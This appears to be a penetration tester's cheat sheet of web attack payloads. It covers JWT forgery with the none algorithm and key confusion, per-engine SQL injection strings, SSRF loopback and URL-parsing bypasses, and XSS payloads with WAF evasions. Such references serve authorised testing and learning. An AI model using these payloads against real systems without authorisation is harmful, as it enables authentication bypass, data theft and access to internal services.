# Attack Patterns Reference

> Common web application attack patterns used by penetration testers.

## JWT Manipulation

### None Algorithm Attack
Change the JWT header algorithm from `RS256` (asymmetric) to `none` and remove the signature. Servers that skip signature verification when algorithm is `none` accept the forged token.

**Test:**
```
Header:  {"alg":"none","typ":"JWT"}
Payload: {"sub":"admin","iat":1516239022}
```

### Algorithm Confusion
If the server uses a public key for RS256 verification but also accepts HS256, the attacker can use the public key (which is public) as the HMAC secret.

**Test:**
```
Header:  {"alg":"HS256","typ":"JWT"}
Payload: {"sub":"admin"}
```
Sign with the server's public key (base64-encoded) as the HMAC secret.

### Key Confusion (JWK Injection)
Some JWT libraries accept an embedded `jwk` header field. If validation doesn't pin the expected key, the attacker supplies their own public key and signs with its private key.

**Test:**
```
Header:  {"alg":"RS256","jwk":{"kty":"RSA", ...}}
```

## SQL Injection per Engine

### MySQL
- `' OR '1'='1' --`
- `' UNION SELECT @@version,2,3 --`
- `' AND SLEEP(5) --` (time-based blind)

### PostgreSQL
- `' OR '1'='1' --`
- `' UNION SELECT version(),2,3 --`
- `' AND pg_sleep(5) --`

### MSSQL
- `' OR '1'='1' --`
- `' UNION SELECT @@version,2,3 --`
- `'; WAITFOR DELAY '00:00:05' --`

### SQLite
- `' OR '1'='1' --`
- `' UNION SELECT sqlite_version(),2,3 --`
- `' AND randomblob(100000000) --` (time-based via heavy computation)

### NoSQL (MongoDB)
- `' || '1'=='1` (JavaScript injection)
- JSON body: `{"username":{"$ne":""},"password":{"$ne":""}}`
- URL param: `?username[$ne]=admin&password[$ne]=x`

## SSRF Bypass Techniques

### IP Address Variations
```
http://127.0.0.1
http://2130706433/          (decimal)
http://0x7f000001/          (hex)
http://0177.0.0.1/          (octal)
http://127.1/               (short form)
http://[::1]/               (IPv6 loopback)
http://0/                   (wildcard on some systems)
```

### DNS Rebinding
Register a domain with a very short TTL and alternate its resolution between a public IP and 127.0.0.1. The first DNS lookup passes hostname validation; the second resolves to internal.

### URL Parsing Bypass
```
http://expected-host@127.0.0.1
http://127.0.0.1#@expected-host
http://expected-host.127.0.0.1.xip.io/
```

## XSS Filter Evasion

### Context-Specific Payloads

**HTML context:**
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<body onload=alert(1)>
```

**Attribute context:**
```html
" onfocus=alert(1) autofocus="
" onmouseover=alert(1) "
```

**JavaScript context:**
```javascript
';alert(1)//
\";alert(1);//
</script><script>alert(1)</script>
```

**CSS context:**
```css
</style><script>alert(1)</script>
background:url(javascript:alert(1))
```

### WAF Bypasses
- `%3Cscript%3Ealert(1)%3C/script%3E` (URL encoding)
- `&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;` (HTML entities)
- `<scr<script>ipt>alert(1)</scr</script>ipt>` (nested break)
- `<<script>alert(1)//<</script>` (leading angle bracket)
- `[1].map(alert)` (no-script XSS via JavaScript globals)

## References

- JWT.io: https://jwt.io/
- PortSwigger Web Security Academy: https://portswigger.net/web-security
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
